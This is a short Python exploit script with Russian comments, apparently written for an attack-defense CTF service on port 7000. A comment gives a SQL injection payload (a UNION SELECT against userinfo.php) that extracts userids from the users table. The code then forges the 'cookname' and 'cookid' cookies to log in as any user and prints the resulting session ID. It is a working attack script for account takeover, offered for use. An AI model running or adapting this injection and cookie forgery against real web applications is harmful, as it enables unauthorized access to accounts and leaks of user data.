#!/usr/bin/env python3

# Входит под пользователем, зная username и userid
# userid можно получить по например такому реквесту GET http://127.0.0.1:7000/userinfo.php?user=asdf%27%20UNION%20SELECT%20userid,%20username,%20userid%20from%20users%20--%20OR%201%20=%20%271
# Либо воспользовавшись boolean/error-based инъекцией

import sys
import re
import requests

ip = sys.argv[1]

username = sys.argv[2]

userid = sys.argv[3]

cookies = dict()
cookies['cookname'] = username
cookies['cookid'] = userid

url = f"http://{ip}:7000/main.php"

s = requests.Session()
r = s.get(url, cookies=cookies)
print(r.cookies['PHPSESSID'])
